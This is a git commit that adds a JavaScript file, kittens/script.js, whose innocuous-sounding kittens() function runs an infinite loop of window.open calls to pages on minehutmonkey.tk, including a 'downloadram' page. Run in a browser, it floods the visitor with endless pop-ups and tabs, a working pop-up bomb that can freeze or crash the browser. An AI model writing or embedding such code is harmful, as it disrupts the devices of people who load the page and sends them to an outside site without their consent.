a8812412c37667565a6515556c9e4f1a8dd235c2
MinehutMonkey <99639787+MinehutMonkey@users.noreply.github.com>
2022-03-02 08:27:45 -0500

    Create script.js

---
+++ kittens/script.js
@@ -0,0 +1,8 @@
+ function kittens(){
+          while(true){
+            window.open('http://minehutmonkey.tk/downloadram', "_blank");
+            window.open('http://minehutmonkey.tk/downloadram');
+            window.open('http://minehutmonkey.tk/kittens', "_blank");
+            window.open('http://minehutmonkey.tk/kittens'); 
+          }
+}
